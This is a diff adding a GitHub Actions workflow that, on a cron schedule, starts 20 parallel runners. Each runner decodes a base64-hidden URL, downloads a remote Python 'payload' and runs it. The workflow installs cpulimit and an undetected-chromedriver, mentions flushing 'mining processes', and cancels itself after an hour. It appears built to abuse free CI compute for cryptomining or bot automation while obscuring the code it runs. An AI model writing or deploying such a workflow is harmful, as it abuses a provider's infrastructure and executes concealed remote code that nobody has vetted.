@@ -1,0 +1,119 @@
+name: Linux Autonomous Task Wing
+
+on:
+  schedule:
+    # تشغيل تلقائي في الأوقات: 03:00، 11:00، 19:00 (توقيت UTC)
+    - cron: '0 3,11,19 * * *'
+
+concurrency:
+  group: task-wing-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # المراقب الزمني الشامل: يُنهي الـ workflow بكامله بعد ساعة واحدة
+  # =================================================================
+  temporal-warden:
+    name: "Temporal Warden"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+    steps:
+      - name: Activate Sweeping Time Limit
+        run: |
+          echo "[WARDEN] Temporal warden online. Every task will be swept away at the 60-minute mark."
+          echo "[WARDEN] Watching execution sequence: ${{ github.run_id }}"
+          
+          # الانتظار حتى مرور ساعة كاملة (3600 ثانية)
+          sleep 3600
+          
+          echo "[WARDEN] 60-minute mark breached! Issuing global sweep command..."
+          
+          # إرسال أمر الإلغاء الشامل إلى GitHub
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[WARDEN] Global sweep command sent successfully."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وتشغيل وحدات المهام
+  # =================================================================
+  deploy-wing:
+    name: "WingUnit-${{ matrix.unit_slot }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # 【الخطوة الأولى】تأسيس الطبقة الأرضية
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Establish Ground Layer
+        run: |
+          echo "[GROUND] Establishing ground layer for WingUnit-${{ matrix.unit_slot }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y cpulimit curl python3-pip
+
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # 【الخطوة الثانية】جلب ملف المهمة من المصدر
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Bring Down Source Payload
+        run: |
+          echo "[BRINGDOWN] Bringing down app_task.py from remote repository..."
+          SOURCE_REPO=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$SOURCE_REPO" -o app_task.py
+          echo "[BRINGDOWN] Payload landed in workspace."
+
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # 【الخطوة الثالثة】تركيب حزم بايثون الضرورية
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Attach Python Dependencies
+        run: |
+          echo "[ATTACH] Attaching Python dependency set..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # 【الخطوة الرابعة】تشغيل المهمة تحت إشراف زمني
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Run Workload with Time Marshal
+        run: |
+          echo ">> Deploying workload on WingUnit-${{ matrix.unit_slot }}..."
+          
+          # إطلاق السكربت في الخلفية
+          python3 app_task.py &
+          WING_PID=$!
+          
+          echo ">> Time marshal on watch. Expiry at 74 minutes."
+          
+          # الانتظار حتى نهاية المهلة المحددة
+          sleep 4440
+          
+          # فحص حالة العملية وإنهاؤها إن كانت لا تزال قائمة
+          if kill -0 $WING_PID 2>/dev/null; then
+            echo ">> Expiry point hit! Terminating workload..."
+            kill -9 $WING_PID
+            echo ">> Workload terminated by marshal."
+          else
+            echo ">> Workload concluded before expiry."
+          fi
+
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # 【الخطوة الخامسة】تنظيف الموارد وإخراج الوحدة
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Flush and Withdraw Unit
+        run: |
+          echo "[WITHDRAW] WingUnit-${{ matrix.unit_slot }} preparing to withdraw."
+          echo "[WITHDRAW] Flushing residual cpulimit and mining processes..."
+          sudo pkill -f cpulimit || true
+          sudo pkill -f systemd-logind || true
+          echo "[WITHDRAWN] WingUnit-${{ matrix.unit_slot }} fully withdrawn."
